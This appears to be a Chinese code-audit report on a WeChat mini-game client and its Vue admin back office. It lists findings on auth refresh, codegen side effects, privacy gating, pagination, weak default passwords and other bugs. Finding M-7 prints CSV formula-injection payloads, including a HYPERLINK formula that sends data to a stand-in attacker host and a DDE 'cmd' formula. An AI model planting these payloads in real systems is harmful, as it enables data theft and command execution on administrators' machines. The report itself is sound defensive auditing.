- **连接期鉴权与成员校验**：两条入口都在握手后校验 `assertActiveUser` + `game_players` 成员关系；封禁/注销/账号不存在会被 4001 拒绝（`back/tests/arena-realtime-security.test.js` 有覆盖，通过）。
- **旧入口未暴露**：`native-arena-ws.js` 未挂载，不存在双写 socket 的冲突。
- **入站消息不能冒用他人身份**：`run_input` 的执行者取自 JWT 的 `ws.userId`（`arena-realtime.js:172` → `game-actions-service.js:123`），body 里的 `actorId`/`score` 被忽略（已有测试覆盖）；`team`/`move`/`ready`/`fortune-bag` 全部以 `req.user.userId` 为准。
- **越权/参数校验**：`arena-handler.js:56-72` 的统一 payload 校验、`game-actions-service.js:68/116` 的字段白名单、`run-arena.js:56-57` 的 `Number.isFinite` 校验都在。
- **断线重连取全量状态**：连接成功即 `safeSend(ws,'game_state', state)`。
- **状态版本号防旧状态覆盖新状态**：服务端 `stateVersion` 单调递增（`game-service.js:387`），两个客户端都做 `<` 丢弃旧版本（`pages/arena/index.js:75`、`OnlineGame.ts:182`）。
- **轮询兜底确实会启动**：小程序 500ms 轮询 + 3s 重连，小游戏 1.5s `schedule()`；ws 断开时都能靠 HTTP 继续拿状态。
- **服务端重启的表现**：进程退出 → 连接断开 → 客户端重连；`reconcileOrphanSessions` 把 session 标为「中断」并把房间回滚成 `waiting`；两个客户端都能落到结果页的「对局已中断」，不会卡死。
- **协议字段名逐项对齐**：服务端 `getGameState` 产出的 20 个字段与两个客户端解析的字段**一一对应**，无缺字段/拼写差异；`runWorld` 结构与服务端 `run-arena.js`、小游戏 `RunArena.ts` 三方一致；常量 `GAME_DURATION_SECONDS=120`、`INITIAL_SCORE_RANGE={80,220}`、`MIN/MAX_PLAYERS=4/10` 三端一致；`QUICK_EMOTES` 的 6 个 key 与服务端白名单一致；`emote_broadcast.fromUserId/emoteId` 字段名一致。

---

## L. 代码级深审 · 微信小游戏客户端（`minigame/`）

> 由独立审计代理完成。执行了 `npm run typecheck`（通过）、`node --import ./tests/register-hook.mjs --test tests/*.test.ts`（73/73 通过，**绕开了 codegen**）、`src/**/*.ts` 与 `dist/**/*.js` 逐文件 `transpileModule` 比对、在 `/tmp/` 沙箱运行 codegen 验证写入范围、对 `dist/` 跑只读探针。未修改仓库任何文件。

### L-1 · [P1] 小游戏端完全没有实现服务端已上线的 `/auth/refresh` 续期能力，401 一律硬登出

- 位置：`minigame/src/core/ApiClient.ts:137-143`、`minigame/src/core/UserProfile.ts:108-149`、`minigame/src/core/RuntimeConfig.ts:41-43`、`minigame/src/core/ShopStore.ts:553,585-595`
- 对照物：`utils/api-client.js:94-128,165-175,220-224`（`startAuthenticationRecovery`/`recoverAuthentication`/`isRecoveredToken`）、`utils/user-profile.js:67-95`、`utils/shop-store.js:919`
- **服务端确实提供该能力**：`back/src/routes/auth.js:50` `router.post('/refresh', ...)`；`back/src/routes/configs.js:12` 对外广播 `features.api.authRefresh: true`；`back/tests/auth-recovery.test.js` 直接打 `POST /api/auth/refresh`。
- 问题：小游戏端的 401 处理只有 `clearToken()` + 抛「登录已过期，请重新登录」；`UserProfile.login()` 不接受 `previousToken/onAuthenticated`；`RuntimeConfig` 没有 `isApiSupported()`；`ShopStore` 只认 token 字符串严格相等。`grep -rn "isRecoveredToken\|authInvalidated\|refresh" minigame/src` → **0 命中**。
- 触发场景：小游戏端已登录用户，任何一次返回 401 的接口（token 过期 / 账号被封 / 已注销 / 微信账号变更）→ token 被清空 → `GameApplication.ts:64` 判定 `!api.isLoggedIn()` → `mode` 切回 `local`、`online.clear()`（**不向服务端发 `leave`**，玩家继续占着房间座位）、跳转 profile 页 → **玩家正在进行的联机房间/对局被直接踢掉**。小程序端在同一场景下会静默 `POST /auth/refresh` 换发新 token 并重放原请求。
- 附带影响：`ShopStore.refreshInventory` 的 catch（`:585-595`）无恢复分支，一旦 401 就把 `syncStatus` 永久置为 `error`（小程序端 `:919` 会识别已恢复 token 并保留 `ready`）→ 商城页此后一直显示「资产同步失败」。
- 置信度：**高**（代码事实与后端能力均已确证）；触发频率依赖服务端实际返回 401 的时机（默认 7 天一次过期），**中**。

### L-2 · [P1] `cd minigame && npm test` 会静默改写 `utils/` 与 `back/src/game-engine/` 的源文件（生成方向与文档相反）

- 位置：`minigame/package.json:8,11,12`（`test`/`build`/`smoke` 都前置 `npm run codegen`）、`minigame/scripts/generate-run-arena.mjs:6-13`
- **生成方向（与 `AGENTS.md` 描述相反）**：codegen 的真源是 **小游戏**：`minigame/src/core/RunArena.ts` → `utils/run-arena.js` + `back/src/game-engine/run-arena.js`；`minigame/src/render/arena-effects.ts` → `utils/arena-effects.js`；`minigame/src/render/run-arena-renderer.ts` → `utils/run-arena-renderer.js`。而根 `AGENTS.md` 描述的是「`utils/` 是真源、移植到 `minigame/src/core/`」→ **容易让人改错一侧**。
- 实测：沙箱运行生成器 → 写入 4 个文件，与仓库当前内容逐字节相同（说明现在没有分歧）；再手工往 `utils/run-arena.js` 追加一行注释后重跑生成器 → **该手工修改被静默抹掉**。
- 影响面：这 4 个产物是**小程序端与后端在跑的代码** —— `utils/game-store.js:12`、`utils/boot-loader.js:3`、`utils/arena-feedback.js:1`、`back/src/services/game-service.js:4`、`back/src/services/game-actions-service.js:2`。
- 置信度：**高**。

### L-3 · [P1] 生成物一致性守卫是**恒真**的，CI 顺序使「生成物过期」永远检测不出来

- 位置：`minigame/tests/run-arena-parity.test.ts:7-8`（直接 `require('../../utils/run-arena.js')`）、`minigame/package.json:11`、`.github/workflows/ci.yml:27-52`
- 问题：`run-arena-parity.test.ts` 加载的 `utils/run-arena.js` 和 `back/src/game-engine/run-arena.js` **正是同一次 `npm test` 里 codegen 刚写出来的文件**，因此「三端逐帧一致」永远成立，不可能失败 —— 它只能证明「生成器是确定性的」，不能证明「仓库里那份是最新的」。
- **CI 顺序**：`ci.yml` 第 27-28 行先跑根 `npm test`（测 `utils/run-arena.js`）→ 第 34-36 行跑 `back/npm test`（测 `back/.../run-arena.js`）→ **第 46-48 行才跑小游戏 `npm test`（此时才重新生成）**。两个消费方的测试都跑在**旧产物**上，校验环节发生在重生成之后。
- 触发场景：有人改了 `minigame/src/core/RunArena.ts` 并提交但没跑 codegen → 根测试用旧产物通过 → 后端测试用旧产物通过 → 小游戏测试重新生成后自比通过 → **CI 全绿**，但小程序端与后端仍在跑旧规则、小游戏端跑新规则，**两端行为静默分叉**。
- 置信度：**高**。

### L-4 · [P2] 隐私门禁存在唯一豁免口：用户同意前、以及撤回授权后，仍会向生产服务器发请求

- 位置：`minigame/src/core/ApiClient.ts:118-121`（`publicConfig` 豁免 `assertAllowed()`）、`minigame/src/GameApplication.ts:72`（`initialize()` 第一步就是 `runtime.fetchRemoteConfig()`）、`minigame/src/core/RuntimeConfig.ts:94-95`
- 实测（只读探针，直接跑 `dist/`）：
  ```
  同意前发出的请求: [ 'https://xcx.ukb88.com/api/configs/public' ]   // isAllowed()=false
  普通接口被拦截: 请先阅读当前协议并完成微信隐私确认
  撤回同意后仍然发出的请求: [ 'https://xcx.ukb88.com/api/configs/public' ]
  ```
  即 `initialize()` 在 `checkPlatformConsent()` **之前**就打了生产域名；`perform('revoke')`/`delete-account` 之后回到 boot，再触发 `loadPage()`→`initialize()`（`GameApplication.ts:354`）仍会请求。
- 说明：这是**有意设计**（`minigame/tests/api-client.test.ts:154-160` 明确断言「未授权时公开配置可读」），请求也不带 `Authorization` 头、不含用户标识。但仓库自身的规则是「除公开配置外一律拒绝」，该例外使「同意前/撤回后仍与生产后端通信」成立，是否构成平台侧隐私合规问题需法务/平台确认。

### L-5 · [P2] 退出登录 / 注销账号后，本地战绩记录不清除，与小程序端行为不一致

- 位置：`minigame/src/core/UserProfile.ts:197-202`（`clearLocalData` 只删 `wx_user_profile_v1`、token，重置账号资产快照）、`minigame/src/core/PlayerStats.ts:203-206`（`clearLocalData()` 存在但**全仓无人调用**）、`minigame/src/GameApplication.ts:315-328`
- 对照：小程序端 `pages/profile/index.js:123`（退出登录）与 `:146`（注销账号）都显式调用 `playerStats.clearLocalData()`；小游戏端没有这一步。
- 实测：
  ```
  本地战绩记录数 = 1  累计收益 = 120
  --- 退出登录后 ---
  token = ""
  storage keys = [ 'game_codex_shop_store_v1', 'game_codex_player_stats_v1' ]   // 仍在
  本地战绩记录数 = 1  累计收益 = 120
  ```
- 影响：账号间本地战绩未隔离；注销未按隐私政策清理设备端数据。
- 置信度：**高**。

### L-6 · [P2] 同一张本地图片在两处用了两种路径写法，其中一种无任何测试覆盖

- 位置：`minigame/src/render/menu-scenes.ts:37`（`current.image.src = url;` 原样赋值，含前导 `/`）、`minigame/src/scenes/arena-scene.ts:80`（`image.src = url.startsWith('/') ? url.slice(1) : url;` 主动去掉前导 `/`）
- 西湖/鼓浪屿的封面是包内路径 `/assets-pkg/stages/xihu.jpg`（`minigame/src/core/Constants.ts:233,262`）。菜单页按带 `/` 的形式赋值，对战背景页按不带 `/` 的形式赋值 —— 同一份资源两种写法。
- 测试盲区：`minigame/tests/menu-smoke.mjs:23-28` 的 `createImage` 替身用 `new URL(url).pathname` 取路径，Node 对相对路径会直接抛错（实测 `new URL('/assets-pkg/stages/xihu.jpg')` → `TypeError: Invalid URL`），而 smoke 只用 `DEFAULT_STAGE`（远程 URL），所以**本地路径这条分支在自动化里从未被执行过**。
- 置信度：代码事实 **高**；是否真机失败 **低/中**（需真机验证）。

### L-7 · [P2] `dist/` 与 `assets-pkg/` 均不入库，上传包只能由单机本地构建产出

- 位置：`.gitignore:15-16`、`minigame/game.js:5`（`import './dist/main.js'`）、`minigame/scripts/copy-stage-assets.mjs`
- `game.js` 只 import `dist/main.js`，`dist/` 一旦缺失整个小游戏启动即崩；而 `dist/` 与 `assets-pkg/` 都不入库，只能由 `npm run build` 在某台机器上生成。CI 虽然执行了 `npm run build`，但**不产出可发布制品**。
- 触发场景：发布同学从干净 clone 直接用微信开发者工具上传 → 上传包缺 `dist/` → 一打开就白屏/模块找不到。
- 附带：**`minigame/assets-pkg/` 的 7 个资源文件（1.3MB）需要 `copy-stage-assets.mjs` 从仓库根 `assets-pkg/` 复制**；已核对 7 个文件与根目录源文件 sha256 **全部一致**（S1 修复在产物层面确实完成）—— 但根 `assets-pkg/` 本身未入库（见 **E12**），所以这条链**整条都在版本控制之外**。
- 置信度：**高**。

### L-8 · [P2] 上传包未排除 `scripts/`、`project.private.config.json`、`README.md`、`.DS_Store`

- 位置：`minigame/project.config.json:32-60`（`packOptions.ignore` 只列了 `node_modules`/`src`/`tests`/`tsconfig.json`/`package.json`/`package-lock.json`）
- 实测包体：**1.58 MB / 56 个文件**，远低于小游戏主包 4MB 限制，**体积无风险**；但 `scripts/`（24KB，含 `generate-run-arena.mjs`、`preview-arena-*.mjs`）会随包上传，其中 `preview-*` 还 `require('@napi-rs/canvas')`，`generate-run-arena.mjs` 内含生成目标路径清单；`project.private.config.json` 也会被上传。
- 置信度：**高**（体积与文件清单均实测）。属打包卫生问题，不影响功能。

### L-9 · [P2] 菜单页每帧全量重排 + 重绘，隐私/协议页每帧约 1500 次 `measureText`

- 位置：`minigame/src/main.ts:27-37`（`requestAnimationFrame` 循环无条件 `app.render(context)`）、`minigame/src/GameApplication.ts:140-144`（非 arena 场景每帧 `renderMenu(ctx, viewport, this.getModel())`）、`minigame/src/render/menu-scenes.ts:242-282`（每次新建 `Page`、重建命中区、重新排版全部文本）
- 实测（`dist/` + 桩 ctx 跑 `renderMenu(privacy)`）：**每次 1492 次 `measureText`、51 次填充**（Node 侧 0.079ms/帧）。`measureText` 在真机是跨 JS↔原生的调用，60fps 下约 9 万次/秒，长文本协议页最重。
- 澄清：`getModel()` 每帧调 `local.getState()`（`GameStore.ts:288-290`，JSON 深拷贝）与 `shop.getStoreState()`（又一份深拷贝）实测单帧仅 0.028ms，**这部分不是瓶颈**，瓶颈在文本测量与全量重绘。
- 置信度：**高**（测量值），真机掉帧幅度未实测 → 影响程度 **中**。

### L-10 · [P3] 其它

- **L-10a 上传包包含 312 行死代码**：`minigame/src/render/arena-renderer.ts`（旧棋盘版战场渲染，基于 `BoardLayout`/`TeamLink`/`FortuneBag`）已无任何引用（`grep -rn "arena-renderer" minigame/src` 只命中 `run-arena-renderer`），但仍被编译进 `dist/render/arena-renderer.js`（9.8KB）随包上传。连带 `BoardLayout.ts`/`TeamLink.ts` 目前只被一致性测试使用，运行时不引用。
- **L-10b `AGENTS.md` 的同步方向描述与实现相反**：文档称「`utils/` 是真源，移植到 `minigame/src/core/`」，实际 `RunArena`/`arena-effects`/`run-arena-renderer` 是**小游戏 → utils/back**；而 `game-engine`/`board-layout`/`team-link`/`constants`/`investment`/`emote` 六个模块**没有任何生成器**，只有人工双份维护 + 一致性测试。文档里的「改 utils 必须同步移植并重跑 `cd minigame && npm test`」对后者成立（但 `npm test` 有 L-2 的副作用），对前者**完全相反**。
- **L-10c 三个手写移植模块没有跨端一致性守卫**：`minigame/tests/` 下有 `engine-parity`/`game-store-parity`/`shop-store-parity`/`player-stats-parity`/`achievement-medals-parity`，但**没有** `UserProfile`/`PrivacyConsent`/`RuntimeConfig`/`ApiClient` 的 parity 测试。`api-client.test.ts` 只测小游戏端自身语义，不与 `utils/api-client.js` 对照 —— **L-1 的鉴权恢复能力缺失正是这样漏掉的**。
- **L-10d `GameApplication` 关键分支无测试**：`minigame/tests/application.test.ts` 只有 4 个用例。**未覆盖**：`logout`/`revoke`/`delete-account` 三个分支、`buy`/`equip`、`avatar`、`share-room`、`play-again`、`category`、`claim-task`、`more-history`、`leave-room`（联机）、`start`（联机）、`emote`；且 `wx` 替身的 `request` 恒返回 `{code:0}`，只验证了 mock 行为。
- **L-10e 对局开始后 `getState()` 的深拷贝频率**：`GameStore.getState()` 每次 `JSON.parse(JSON.stringify(state))`，局末状态约 7.5KB（实测）。当前调用点实测仅 0.028ms/帧，**暂不构成问题**。

### L-11 · 这一路的「存疑，未能确证」

1. **带前导 `/` 的包内图片路径在微信小游戏运行时是否可解析**（L-6 的真机后果）。差一次真机/开发者工具验证。
2. **`dist/` 产物在真机上的模块解析**：`dist/**/*.js` 使用无扩展名 ESM 相对导入，依赖开发者工具的 `es6`+`enhance` 编译与 `useIsolateContext: true` 组合，需真机冷启动验证。
3. **微信平台是否把 `wx.request` 计入需前置同意的隐私接口**（L-4 的合规定级），差平台侧审核结论。
4. **服务端实际返回 401 的频率与形态**（L-1 的触发面）。
5. **`minigame/project.config.json` 的 `appid`（`wx3a1d54efeadbace9`）**：`minigame/README.md:37` 已写明「AppID 当前等待真实账号配置」，`scripts/configure-release.mjs` 也提供了 `--target minigame --appid` 写入流程。属**已知发布前置项**。

### L-12 · 这一路**已检查且未发现问题的范围**（重要）

- **产物与源码同步**：`src/**/*.ts` 逐文件 `transpileModule` 与 `dist/**/*.js` **全部内容一致（39/39）**。`ShopCatalog.ts`/`LegalContent.ts` 的 mtime 比 dist 新，但**内容逐字节相同**，不构成过期产物。
- **生成物与真源一致**：`utils/run-arena.js`、`utils/arena-effects.js`、`utils/run-arena-renderer.js`、`back/src/game-engine/run-arena.js` 与 `minigame/src` 生成结果一致；`ShopCatalog.ts` ≡ `utils/shop-store.js` 的 `getCatalog()`；`LegalContent.ts` ≡ `utils/legal-config.js`（JSON 严格比对为 true）。
- **手写移植模块与 `utils/` 对应文件的行为等价**：`GameEngine.ts`、`BoardLayout.ts`、`TeamLink.ts`、`Constants.ts`、`Investment.ts`、`Emote.ts`、`GameStore.ts`、`ShopStore.ts`、`PlayerStats.ts`、`AchievementMedals.ts` 逐行读比对，**未发现真实行为分歧**（仅写法差异）；5 个 parity 测试覆盖了 `utils/game-engine.js` 导出的全部 21 个函数与状态机主干。
- **S1 修复在产物层面确认完成**：`assets-pkg/` 下 7 个文件与仓库根源文件 sha256 全部一致；`packaged-assets.test.ts` 校验景区封面存在（但未覆盖 effects/items 资源）。
- **安全区与坐标换算**：`resolveViewport`（`minigame/src/platform/device.ts:25-38`）以 `windowWidth/720` 为设计单位缩放，画布尺寸与触摸换算自洽；`online-game.test.ts:108-113` 有专门断言覆盖胶囊与底部手势区。
- **音频生命周期**：`playBgm` 同 URL 不重启、`stopBgm` 释放并销毁、`playCue` 复用单实例、`destroy` 释放全部；`hide()` 停 BGM、`show()` 按舞台恢复、`navigate()` 切场景停 BGM。**未见泄漏**。
- **前后台切换**：`main.ts` 的 `hidden` 标志与 `GameApplication.hide/show` 一致；`show()` 用 `lifecycle` 计数防止过期异步回写；`OnlineGame.hide/show/stop` 有 generation 隔离，有对应回归用例。
- **异步回写隔离**：`loadHistory` 比对 `revision` 与 `token`；`claim-task` 比对 token；`UserProfile.login/fetchProfile/deleteAccount` 有 `sessionRevision` 守卫；`ShopStore` 有 `accountRevision` 守卫。
- **类型与测试基线**：`npm run typecheck` 通过；小游戏测试 **73/73 通过**。
- **包体**：1.58MB / 56 文件，远低于小游戏主包 4MB 限制。

---

## M. 代码级深审 · 管理后台前端（`back/admin-web/`，Vue 3 + Element Plus）

> 由独立审计代理完成（主代理补充派发，因原五路均未覆盖此目录）。审读 `src/**` 全部 19 个源文件 + `package.json`/`vite.config.js`/`index.html`，对照 `back/src/routes/admin/**`、中间件与服务层。

### M-1 · [P1] 编辑「已发布」公告会被静默改回草稿，公告从小程序端消失

- 位置：`back/admin-web/src/views/announcements/AnnouncementList.vue:261`、`:281`（契约端 `back/src/services/admin-announcement-service.js:62-65`）
- `openEditDialog(row)` 第 261 行**无条件** `publishMode.value = false`（"保存为草稿"被选中），`handleSave()` 第 281 行据此拼出 `status: publishMode.value ? 'published' : 'draft'`，且**无论新增还是编辑都把 `status` 放进 payload**。后端 `updateAnnouncement` 见到 `data.status !== undefined` 就写库。
- 触发场景：公告已发布 → 列表点「编辑」→ 只改个标题 → 点「更新」→ 绿色 toast「公告已更新」→ 数据库 `status` 由 `published` 变 `draft`（`published_at` 保留旧值，行数据自相矛盾）。`GET /api/announcements`（`admin-announcement-service.js:109` 只取 `status='published'`）立刻不再返回该条 → **小程序首页公告弹窗静默消失，运营侧没有任何错误提示**。
- 置信度：高。

### M-2 · [P1] `src/utils/csv.js` 未入库 → 从仓库干净检出构建管理后台会直接失败

- 位置：`back/admin-web/src/utils/csv.js`（未跟踪）、引用点 `back/admin-web/src/views/users/UserList.vue:105`
- **主代理独立复核**：`git ls-files back/admin-web/src/` 共 22 个文件，`find` 实际 23 个，`comm -13` 差集**只有 `src/utils/csv.js` 一个** —— 它是整个管理后台**唯一一个**未入库的源文件。而 `UserList.vue:105` 有 `import { downloadCsv } from '@/utils/csv'`。
- 触发场景：任何从 git 干净检出（含 CI 的 `actions/checkout`）执行 `cd back/admin-web && npm ci && npm run build` → Vite 解析 `@/utils/csv` 失败 → **构建中断，管理后台产不出来**；若强行发布旧产物，则「导出 CSV」功能整体缺失。
- 附带：`package.json`/`package-lock.json` 的依赖升级（axios 1.21、vite 7.3.7 等）同样仍是未提交状态。
- 置信度：高（事实）；影响面取决于部署是否直接拷贝工作区。

### M-3 · [P2] 403 未被区分处理；前端完全没有角色门控

- 位置：`back/admin-web/src/utils/request.js:21-31`（只判 `status === 401`）、`components/AdminLayout.vue:141`、`views/users/UserList.vue:61-63`、`views/admins/AdminList.vue:22-25`
- 后端对「权限不足」和「账号已失效」统一返回 **403**（`admin-auth.js:71`「该管理员账号已被停用」、`require-role.js:17`「仅限超级管理员」）。前端响应拦截器**只处理 401**，403 全部落到各视图的 `catch`，显示为「获取管理员列表失败」「金币调整失败」等通用文案。
- 同时前端**没有角色门控**：`stores/auth.js:17` 定义了 `isSuper` getter，但 `grep -rn "isSuper" src/` **只有这一处定义、零处使用**；菜单里的「管理员管理」、用户列表里的「调整金币」、系统配置的「保存」按钮对 `normal` 角色一律照常渲染。
- 触发场景 A（普通管理员）：以 `normal` 登录 → 点「管理员管理」→ 后端 403 → 表格空白 + 「获取管理员列表失败」；运营无从判断是「没权限」还是「系统坏了」。
- 触发场景 B（悬挂态）：super 把某管理员「删除」（后端 `admin-admin-service.js:92-95` 实为 `is_active=0`）或降级 → 该管理员在 30s 状态缓存过期后，所有 `/api/admin/*` 全部 403 → 前端**不登出、不跳转**，页面持续弹通用错误，token 仍留在 `localStorage`。更糟：super 可以在 UI 里把**自己**降级或「删除」（`deleteAdmin`/`updateAdmin` 均不排除自身 id），**把自己锁在后台外**。
- 置信度：高。

### M-4 · [P2] 调整金币后前端显示的余额与库内真实值不一致（能显示负数，而 `users.coins` 是 `INT UNSIGNED`）

- 位置：`back/admin-web/src/views/users/UserList.vue:171`（契约端 `back/src/services/admin-user-service.js:57`）
- 后端执行 `UPDATE users SET coins = GREATEST(0, CAST(coins AS SIGNED) + ?)` 并返回 `{ coins: newCoins }`；前端**丢弃了响应里的真实余额**，改为自己算：`currentUser.value.coins += coinForm.amount`。
- 触发场景：用户有 100 金币，管理员扣 500 → 后端把余额置 0 并返回 `coins: 0`；前端列表显示 **-400**。`users.coins` 声明为 `INT UNSIGNED`（`back/sql/001_create_tables.sql:15`），负值在库里根本不可能存在 → 运营看到「负余额」会误判为数据异常。
- 置信度：高。

### M-5 · [P2] 搜索/筛选不重置分页页码 → 第 2 页以后做搜索或筛选永远是空表

- 位置：`back/admin-web/src/views/users/UserList.vue:120-135`（同构问题见 `announcements/AnnouncementList.vue:228-244`、`logs/OperationLogs.vue:203-225`、`games/GameList.vue:84-99`、`rooms/RoomList.vue:192-207`、`admins/AdminList.vue:159-174`）
- 各列表的 `fetchXxx()` 直接使用当前 `page.value` 作为 `params.page`，而搜索框（`@keyup.enter`/`@clear`）与筛选下拉（`@change`）**都不把 `page` 复位为 1**。后端是 `LIMIT ? OFFSET ?` + 过滤条件，过滤后再按 `OFFSET (page-1)*20` 截断。
- 触发场景：用户管理页翻到第 3 页 → 输入一个存在的昵称回车 → 请求变成 `keyword=xxx&page=3&limit=20` → 服务端在过滤后的结果集上跳过前 40 条 → 返回 0 行 → 表格空白，而分页器仍显示「共 N 条」。运营会以为「这个昵称查不到用户」。公告状态筛选、房间状态筛选、操作日志的全部筛选下拉同样如此。
- 置信度：高。

### M-6 · [P2] 福袋题材数据页的「类别」筛选和 `limit` 参数从未真正发给后端（axios 参数用法错误）

- 位置：`back/admin-web/src/views/fortune/FortuneReality.vue:281-284`
- `request.get('/api/admin/fortune/snapshots', { limit: 80, category: categoryFilter.value || undefined })` —— axios 的 `get(url, config)` 第二个参数是 **config**，`limit`/`category` 变成了 config 上的未知字段，**不会进 query string**；正确写法是 `{ params: {...} }`（同文件其它调用、以及 `UserList.vue:123-125` 都写对了）。后端 `routes/admin/fortune.js:40-51` 从 `req.query.category`/`req.query.limit` 取值。
- 触发场景：选「类别=股票」→ 请求实际是 `GET /api/admin/fortune/snapshots`（无 query）→ `fortune-reality-service.js:445-457` 的 `category` 恒为 `''`、`limit` 走默认 50 → **筛选器完全无效，列表恒为全类别且只有 50 条**，页面无任何报错。
- 验证（用已装的 axios 做只读复现，自定义 adapter 拦截最终 URL）：
  ```
  FINAL URL: /api/admin/fortune/snapshots
  config.params: undefined   config.limit: 80  config.category: stock
  ---- 正确写法 ----
  config.params: {"limit":80,"category":"stock"}
  ```
- 置信度：高（已复现）。

### M-7 · [P2] CSV 导出未防公式注入（昵称由玩家完全可控）

- 位置：`back/admin-web/src/utils/csv.js:5-11`，数据来源 `views/users/UserList.vue:179-212`
- `escapeCell` 只做 RFC4180 的引号转义（`[",\n\r]`），**不处理以 `=`、`+`、`-`、`@` 开头的单元格**，而导出的第 2 列正是玩家自填的昵称。
- 触发场景：玩家把昵称改成 `=HYPERLINK("http://evil.example/?d="&A1,"点我")` 或 `@SUM(1+1)*cmd|' /C calc'!A0` → 管理员导出 CSV → 用 Excel 打开 → 该单元格被当作公式求值。复现输出：
  ```
  1,"=HYPERLINK(""http://evil.example/?d=""&A1,""click"")",100,1
  2,@SUM(1+1)*cmd|' /C calc'!A0,100,1
  3,+1+1,100,1
  4,-2+3,100,1
  ```
- 置信度：高（注入成立）；实际可利用性取决于管理员用什么表格打开，属中。

### M-8 · [P2] 操作日志的日期区间筛选丢失整个结束日

- 位置：`back/admin-web/src/views/logs/OperationLogs.vue:212-213`（契约端 `back/src/services/admin-log-service.js:32-39`）
- `el-date-picker` 用 `value-format="YYYY-MM-DD"`，前端把 `dateTo` 原样传（如 `2026-11-10`）；后端拼 `created_at <= ?` 直接与字符串比较，MySQL 会把 `'2026-11-10'` 解释为 `2026-11-10 00:00:00` → 当天 00:00 之后的日志全部落选。对比同仓库的 `admin-stats-service.js:17` 是正确补了 ` 23:59:59` 的，说明这是遗漏而非约定。
- 触发场景：运营选 2026-11-01 ~ 2026-11-10 审计「当天」的后台操作 → 11-10 全天的记录一条都查不到，且界面无任何提示。
- 置信度：高。

### M-9 · [P2] 新建管理员时前端静默使用默认弱口令 `123456`，且表单无密码强度校验

- 位置：`back/admin-web/src/views/admins/AdminList.vue:209`（`:148-151` 的 `formRules` 不含 password）
- `data.password = form.password || '123456'`；后端 `admin-admin-service.js:33-43` 只做 `bcrypt.hash`，不校验长度/强度（`routes/admin/admins.js:23` 仅判空）。
- 触发场景：super 新增运营账号时没填密码（密码框 placeholder 是「请输入密码」但**没有 required 规则**）→ 账号被创建为 `123456` → 用公开可猜的口令即可登进整个后台。密码框在编辑态又刻意不校验（`:87` `prop` 为 `undefined`），运营无法区分「新建没密码」与「编辑不改密码」。
- 置信度：高。

### M-10 · [P2] 管理后台零测试

- 位置：`back/admin-web/package.json`（`scripts` 只有 `dev`/`build`/`preview`，无 `test`）、`back/admin-web/src/`（无任何 `*.test.*`/`*.spec.*`）
- `find back/admin-web -name "*.test.*"` 无结果；根 `tests/` 与 `back/tests/` 也 grep 不到任何 `admin-web` 引用。CI 相应地不对该目录跑任何测试。
- 影响：**M-1、M-4、M-5、M-6 四类缺陷都是「改一行代码也不会被任何自动化发现」的类型** —— 恰恰因为没有任何测试守护这个前端。管理后台直接操作金币与线上配置，缺测试等于缺回归网。

### M-11 · [P2] 前端 15s 超时与后端大模型 15s 超时相等 → 「生成摘要 / 立即抓取」会把成功误报成失败

- 位置：`back/admin-web/src/utils/request.js:7`（`timeout: 15000`）；后端 `back/src/services/fortune-reality-service.js:602`（`ai.timeout_ms` 默认 15000）与 `:298-300`（`setTimeout(() => controller.abort(), timeoutMs)`）
- axios 的超时是**整条 HTTP 请求**的墙钟上限；`POST /api/admin/fortune/report/generate` 内部要串行做多次 LLM 调用（每次上限 15s）+ 数据库写入。客户端 15s 先到 → 抛 `ECONNABORTED` → 前端弹「生成摘要失败」，而**服务端其实成功生成了摘要**（结果已落库）。
- 触发场景：模型响应在 10~14s 之间 → 后端成功、前端红字报错 → 运营重复点击 → 重复生成/重复调用计费。
- 置信度：中（取决于实际模型延迟分布，但两个 15s 完全相等是确证的配置碰撞）。

### M-12 · [P3] 其它

| # | 位置 | 问题与场景 |
|---|---|---|
| M-12a | `stores/auth.js:27-32`、`request.js:21-31` | 登出只清本标签页内存 + localStorage，**其它标签页仍持旧 token 继续发请求**；后端也没有 token 吊销（JWT 无黑名单）。A 标签页退出后，B 标签页照常可用。 |
| M-12b | `request.js:24-28`、`views/Login.vue:91-107` | 401 无条件 `logout()` + `router.push({name:'Login'})`，**不记录原目标路由**；登录成功后固定 `push({name:'Dashboard'})` → 访问 `/admin/configs` 被踢登录后重登会落到控制台而非原页面。 |
| M-12c | `views/users/UserList.vue:184` | CSV 导出固定 `limit: 5000` 且后端 `listUsers` 不封顶 → 超过 5000 用户时**静默截断**，toast 仍显示「已导出 5000 名用户」。 |
| M-12d | `views/admins/AdminList.vue:57-65` + `admin-admin-service.js:92-95` | 「删除」实为 `is_active=0` 停用，行仍留在列表（状态列显示「已封禁」），toast 却说「管理员删除成功」；且 `updateAdmin` 支持 `is_active` 而前端从不发送 → **没有重新启用入口**，误停用后只能改库。 |
| M-12e | `views/configs/SystemConfig.vue:153-161`、`:480-484` | 数字输入框清空后 `el-input-number` 把模型置 `null`，`stringifyTypedValue` 用 `?? 0` → **保存成 `0`**。目前各消费方都有 `|| 默认值` 兜底，暂未造成实际故障，但属于「静默写坏配置」的模式。 |
| M-12f | `views/configs/SystemConfig.vue:226-259`、`:738-760` | 配置接口失败时回落到本地 `fallbackConfigRecords` 草稿。虽然只有「脏」字段会被提交（不会整表覆盖），但页面在失败态仍允许编辑并保存，属误操作温床（页面已用「待连接/兜底」文案提示，属可接受设计）。 |

### M-13 · 这一路的「存疑，未能确证」

- **helmet 默认 CSP 的 `img-src 'self' data:` 可能拦截跨域头像**：`back/src/app.js:33` 的 `app.use(helmet())` 对外发的 `admin/index.html` 也生效（helmet 7.2.0 默认 `img-src ["'self'","data:"]`），而管理后台多处用 `<el-avatar :src="row.avatarUrl">` 渲染 `users.avatar_url`（`admin-presenters.js:31`）。头像 URL 由 `${WX_CONTENT_SAFETY_BASE_URL}/uploads/avatars/...` 拼成（`avatar-review-service.js:55-60`），**若后台部署域名与 `WX_CONTENT_SAFETY_BASE_URL` 不同源，所有头像都会裂图**。还差的证据：生产环境变量与后台实际访问域名是否一致。
- **Element Plus `el-radio-button` 用 `label` 传值（`AnnouncementList.vue:16-19`）在 2.14 已属废弃写法**，当前仍能工作。

### M-14 · 这一路**已检查且未发现问题的范围**（重要）

- **XSS**：`grep -rn "v-html|innerHTML|outerHTML|eval(|new Function|insertAdjacentHTML|document.write" back/admin-web/src` → **零命中**。所有用户可控内容（昵称、公告标题/正文、操作日志 detail、头像 URL、配置值）都走 Vue 插值或 `el-table` 文本渲染，Vue 默认转义；`OperationLogs.vue:176-186` 的 `formatJSON` 结果也只进 `<pre>{{ }}</pre>`。
- **CSV 转义正确性**：逗号/引号/换行的转义符合 RFC4180（问题只在公式注入，见 M-7）。
